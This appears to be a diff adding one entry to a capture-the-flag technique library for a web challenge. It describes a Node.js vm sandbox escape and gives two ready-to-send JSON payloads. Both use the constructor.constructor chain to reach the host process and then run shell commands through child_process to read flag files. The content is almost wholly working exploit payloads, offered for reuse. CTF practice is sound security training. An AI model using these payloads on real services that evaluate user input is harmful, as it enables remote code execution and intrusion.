@@ -1,0 +1,10 @@
+{
+  "name": "计算器的阴谋-jksn2025final",
+  "category": "web",
+  "technique": "Node.js vm sandbox escape (constructor.constructor host-Function chain -> process.mainModule -> child_process RCE)",
+  "when_to_use": "challenge looks like web; recall from writeup '计算器的阴谋-jksn2025final'",
+  "commands": [
+    "{\"expression\": \"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()\"}",
+    "{\"expression\": \"(()=>{}).constructor.constructor('return process')().require('child_process').execSync('cat /tmp/flag').toString()\"}"
+  ]
+}
